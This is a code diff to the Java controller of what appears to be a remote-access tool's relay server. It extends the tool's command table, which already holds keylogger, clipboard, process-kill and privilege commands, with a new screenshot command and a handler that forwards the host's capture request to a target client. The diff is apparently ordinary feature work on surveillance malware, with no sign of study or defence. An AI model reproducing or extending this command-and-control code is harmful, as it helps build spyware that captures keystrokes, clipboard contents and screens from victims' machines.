@@ -22,6 +22,7 @@ public class Controller {
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_GET_HOST_PRIVILEGE, Controller::getHostPrivilege);
         put(COMMAND_CLIENT_MONITOR, Controller::getClientMonitor);
+        put(COMMAND_CLIENT_SCREENSHOT, Controller::getClientScreenshot);
         put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
         put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
@@ -83,6 +84,14 @@ public class Controller {
     private static void getClipboard(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
             onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_CLIPBOARD).json());
+            return;
+        }
+        Server.getHost().onSend(json.toString());
+    }
+
+    private static void getClientScreenshot(JSON json, SocketModel sender) {
+        if (isHost(sender.getUUID())) {
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_SCREENSHOT).json());
             return;
         }
         Server.getHost().onSend(json.toString());
